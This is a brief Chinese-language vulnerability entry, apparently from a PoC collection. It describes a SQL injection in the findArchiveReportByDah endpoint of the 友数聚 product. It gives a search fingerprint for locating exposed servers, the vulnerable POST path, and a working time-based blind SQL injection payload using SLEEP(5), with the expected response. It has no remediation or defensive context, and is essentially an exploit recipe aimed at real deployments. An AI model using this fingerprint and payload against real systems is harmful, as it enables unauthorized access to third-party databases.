# 友数聚findArchiveReportByDah存在SQL注入漏洞

友数聚 ｜ SQL注入 ｜ —
- **指纹**：`body="/cpasm4/static/cap/font/iconfont.css"`
- **请求**：`POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1`

**Payload**
```
dah=0' AND (SELECT 6451 FROM (SELECT(SLEEP(5)))oufm) AND 'lRBm'='lRBm
```
- **响应特征**：200